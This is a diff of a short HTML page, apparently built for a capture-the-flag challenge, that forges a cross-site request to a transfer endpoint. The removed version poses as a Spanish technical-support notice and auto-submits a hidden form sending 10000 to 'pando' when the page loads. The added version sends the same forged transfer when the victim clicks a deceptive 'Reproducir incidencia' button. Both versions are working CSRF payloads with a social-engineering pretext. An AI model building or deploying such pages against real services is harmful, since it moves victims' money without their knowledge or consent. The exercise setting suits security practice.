@@ -1,21 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Soporte Técnico - Procesando Incidencia</title>
-</head>
-<body>
-    <p>Cargando información para el administrador... Por favor, no cierre esta ventana.</p>
-    
-    <form id="exploitForm" action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
-        <input type="hidden" name="recipient" value="pando" />
-        <input type="hidden" name="amount" value="10000" />
-    </form>
+  <body>
+    <h2>Incidencia en transferencia</h2>
+    <p>Pulse el botón para reproducir el error.</p>
 
-    <script>
-        // Se ejecuta automáticamente al cargar la página
-        window.onload = function() {
-            document.getElementById('exploitForm').submit();
-        };
-    </script>
-</body>
+    <form action="https://ctf.fap.hispasec.com:8009/transfer" method="POST">
+      <input type="hidden" name="to" value="pando">
+      <input type="hidden" name="amount" value="10000">
+      <input type="submit" value="Reproducir incidencia">
+    </form>
+  </body>
 </html>
